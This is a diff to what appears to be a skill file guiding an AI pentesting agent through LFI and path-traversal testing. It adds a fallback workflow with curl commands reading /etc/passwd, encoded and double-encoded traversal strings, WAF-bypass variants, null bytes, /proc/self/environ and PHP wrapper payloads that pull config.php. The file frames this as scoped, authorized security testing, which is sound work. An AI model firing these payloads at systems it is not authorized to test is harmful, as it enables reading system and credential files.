@@ -55,10 +55,38 @@ LFI / path traversal — user input used in file paths (include, read, open) wit
 - Only read PoC files (e.g. /etc/passwd, win.ini). No writes, no overwrite attempts, no sensitive paths beyond PoC.
 - In-scope only.
 
+## Error Recovery & Fallback
+
+### Primary Tool
+**curl** — send traversal payloads directly via HTTP requests.
+
+### Fallback Tool
+**craft_payload + encoding variants** — when direct traversal fails, try encoded/obfuscated paths.
+
+### Error Patterns & Recovery
+
+| Error Pattern | Detection | Recovery Action |
+|---|---|---|
+| **Timeout** | curl hangs >30s | Retry with `--connect-timeout 10 --max-time 20`. If still timeout, skip parameter. |
+| **Connection refused** | `curl: (7) Couldn't connect` | Skip parameter, log "target unreachable". If all fail, escalate to user. |
+| **WAF block** | HTTP 403/406, "blocked", traversal stripped | Pivot to **memory_get**(path: "skills/waf-bypass/SKILL.md"). Try: `..%2f`, `%2e%2e/`, `..%252f`, `....//....//`, null byte `%00` (legacy). |
+| **400/404 on traversal** | HTTP 400 or 404 with traversal path | Try fewer levels (`../` vs `../../../../`), try different target files (`/etc/hostname`, `/proc/self/environ`). |
+| **Empty response** | 200 OK but no file content | Try: different file targets, add null byte, try path without leading `/` (e.g. `../../../etc/passwd` vs `/etc/passwd`). |
+| **Rate limit (429)** | HTTP 429 | Stop, log tested params, report partial results. |
+| **PHP wrapper needed** | Direct traversal returns empty | Try PHP wrappers: `php://filter/convert.base64-encode/resource=index`, `data://text/plain;base64,PD9waHA=`. |
+
+### Manual Fallback Workflow (when direct traversal fails)
+1. **exec**(curl -s "URL?file=../../../etc/passwd") — direct traversal.
+2. If blocked: try **craft_payload** with encoding — `..%2f..%2f..%2fetc%2fpasswd`.
+3. Try double encoding: `%252e%252e%252f` or `....//....//....//etc/passwd`.
+4. Try PHP wrappers if target is PHP: `php://filter/convert.base64-encode/resource=config.php`.
+5. If nothing works after 4-5 variants, log "not exploitable" and move on.
+
 ## When to Escalate or Pivot
 
 - If WAF blocks traversal strings: try encoding (..%2f, %2e%2e/) or **memory_get**(path: "skills/waf-bypass/SKILL.md"); do not brute-force.
 - If no LFI: log and move to next parameter or checklist area.
+- If all tools fail (timeout, crash, WAF): log error details, mark parameter as "skipped — tool failure", and move on. Never leave parameter unlogged.
 
 ---
 
